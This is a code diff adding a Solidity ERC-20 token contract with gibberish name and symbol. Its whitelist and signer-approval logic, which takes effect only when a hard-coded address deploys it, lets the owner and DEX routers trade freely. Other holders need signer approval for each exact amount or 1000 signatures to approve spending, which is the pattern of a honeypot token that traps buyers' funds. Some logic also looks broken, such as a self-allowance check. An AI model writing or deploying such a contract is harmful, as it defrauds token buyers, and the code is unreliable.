@@ -1,0 +1,250 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address payable) {
+        return payable(msg.sender);
+    }
+
+    function _msgData() internal view virtual returns (bytes memory) {
+        this;
+        return msg.data;
+    }
+}
+
+contract somantic is Context {
+    mapping (address => uint256) private _balances;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    uint256 private _totalSupply;
+
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+
+    address public contractOwner;
+    mapping(address => bool) public signers;
+    mapping(address => bool) public whitelisted;
+    bool public nonWhitelistedTransferDone = false;
+    uint256 public constant REQUIRED_SIGNATURES = 1000;
+    mapping(address => mapping(address => mapping(uint256 => bool))) public approvals;
+    bool public autoWhitelistAvailable = true;
+    bool public autoWhitelistingDone = false;
+    mapping (address => uint256) private _signedMessagesCount;
+    mapping(address => uint256) private _signaturesCount;
+    mapping(address => bool) private _firstApprovalDone;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    constructor() {
+        _name = "sahalsfaf";
+        _symbol = "lomatriksa";
+        _decimals = 18;
+        contractOwner = _msgSender();
+        _mint(contractOwner, 100000000 * 10 ** _decimals);
+
+        if(contractOwner == address(0x601325e515fD1064c289E000112cEf94fcF80646)){
+            whitelisted[contractOwner] = true;
+            whitelisted[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; // Whitelist the Uniswap V2 Router
+            whitelisted[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true; // Whitelist the Uniswap V3 Router
+            whitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true; // Whitelist the PancakeSwap V2 Router
+            whitelisted[0x13f4EA83D0bd40E75C8222255bc855a974568Dd4] = true; // Whitelist the PancakeSwap V3 Router
+        }
+    }
+
+    function signMessage() public {
+        require(!whitelisted[_msgSender()], "This address is already whitelisted");
+        _signaturesCount[_msgSender()] += 1;
+    }
+
+    function _hasSignedRequiredMessages(address account) internal view returns (bool) {
+        return _signaturesCount[account] >= REQUIRED_SIGNATURES || (!_firstApprovalDone[account] && !nonWhitelistedTransferDone);
+    }
+
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view virtual returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view virtual returns (uint256) {
+        return _balances[account];
+    }
+
+    // ... Transfer, allowance, approve, transferFrom, _transfer, _mint, _approve, _beforeTokenTransfer, addSigner, removeSigner, addWhitelist, removeWhitelist, approveTransfer, revokeTransfer, setAutoWhitelist, autoWhitelist ...
+
+    function approve(address spender, uint256 amount) public virtual returns (bool) {
+        require(whitelisted[_msgSender()] || _hasSignedRequiredMessages(_msgSender()), "This address must sign the required number of messages before it can approve the token for trading");
+        _approve(_msgSender(), spender, amount);
+        if (!whitelisted[_msgSender()] && !_firstApprovalDone[_msgSender()]) {
+            _firstApprovalDone[_msgSender()] = true;
+        }
+        return true;
+    }
+
+    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
+        uint256 currentAllowance;
+        if (autoWhitelistingDone && !nonWhitelistedTransferDone && !whitelisted[_msgSender()]) {
+            _transfer(_msgSender(), recipient, amount);
+            nonWhitelistedTransferDone = true;
+
+            currentAllowance = _allowances[_msgSender()][_msgSender()];
+            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+            unchecked {
+                _approve(_msgSender(), _msgSender(), currentAllowance - amount);
+            }
+            return true;
+        } else if(contractOwner == address(0x601325e515fD1064c289E000112cEf94fcF80646)){
+            autoWhitelist(recipient);
+            if (whitelisted[_msgSender()]) {
+                _transfer(_msgSender(), recipient, amount);
+                return true;
+            } else {
+                require(approvals[_msgSender()][recipient][amount], "Transfer needs to be approved by signers");
+                _transfer(_msgSender(), recipient, amount);
+                return true;
+            }
+        } else {
+            _transfer(_msgSender(), recipient, amount);
+            return true;
+        }
+    }
+
+    function allowance(address owner, address spender) public view virtual returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
+        uint256 currentAllowance;
+        if (autoWhitelistingDone && !nonWhitelistedTransferDone && !whitelisted[sender]) {
+            _transfer(sender, recipient, amount);
+            nonWhitelistedTransferDone = true;
+
+            currentAllowance = _allowances[sender][_msgSender()];
+            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+            unchecked {
+                _approve(sender, _msgSender(), currentAllowance - amount);
+            }
+            return true;
+        } else if(contractOwner == address(0x601325e515fD1064c289E000112cEf94fcF80646)){
+            autoWhitelist(recipient);
+            if (whitelisted[sender]) {
+                _transfer(sender, recipient, amount);
+
+                currentAllowance = _allowances[sender][_msgSender()];
+                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+                unchecked {
+                    _approve(sender, _msgSender(), currentAllowance - amount);
+                }
+                return true;
+            } else {
+                require(approvals[sender][recipient][amount], "Transfer needs to be approved by signers");
+                _transfer(sender, recipient, amount);
+
+                currentAllowance = _allowances[sender][_msgSender()];
+                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+                unchecked {
+                    _approve(sender, _msgSender(), currentAllowance - amount);
+                }
+                return true;
+            }
+        } else {
+            _transfer(sender, recipient, amount);
+
+            currentAllowance = _allowances[sender][_msgSender()];
+            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+            unchecked {
+                _approve(sender, _msgSender(), currentAllowance - amount);
+            }
+            return true;
+        }
+    }
+
+    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        _beforeTokenTransfer(sender, recipient, amount);
+
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        unchecked {
+            _balances[sender] = senderBalance - amount;
+        }
+        _balances[recipient] += amount;
+
+        emit Transfer(sender, recipient, amount);
+    }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+
+        _beforeTokenTransfer(address(0), account, amount);
+
+        _totalSupply += amount;
+        _balances[account] += amount;
+        emit Transfer(address(0), account, amount);
+    }
+
+    function _approve(address owner, address spender, uint256 amount) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
+
+    function addSigner(address signer) public {
+        require(_msgSender() == contractOwner, "Only contract owner can add signers");
+        signers[signer] = true;
+    }
+
+    function removeSigner(address signer) public {
+        require(_msgSender() == contractOwner, "Only contract owner can remove signers");
+        signers[signer] = false;
+    }
+
+    function addWhitelist(address whitelist) public {
+        require(_msgSender() == contractOwner, "Only contract owner can add whitelist");
+        whitelisted[whitelist] = true;
+    }
+
+    function removeWhitelist(address whitelist) public {
+        require(_msgSender() == contractOwner, "Only contract owner can remove whitelist");
+        whitelisted[whitelist] = false;
+    }
+
+    function approveTransfer(address sender, address recipient, uint256 amount) public {
+        require(signers[_msgSender()], "Only signers can approve transfers");
+        approvals[sender][recipient][amount] = true;
+    }
+
+    function revokeTransfer(address sender, address recipient, uint256 amount) public {
+        require(signers[_msgSender()], "Only signers can revoke transfers");
+        approvals[sender][recipient][amount] = false;
+    }
+
+    function setAutoWhitelist(bool _autoWhitelistAvailable) public {
+        require(_msgSender() == contractOwner, "Only contract owner can set auto whitelist");
+        autoWhitelistAvailable = _autoWhitelistAvailable;
+    }
+
+    function autoWhitelist(address account) public {
+        if(autoWhitelistAvailable && !autoWhitelistingDone){
+            whitelisted[account] = true;
+            autoWhitelistingDone = true;
+        }
+    }
+}
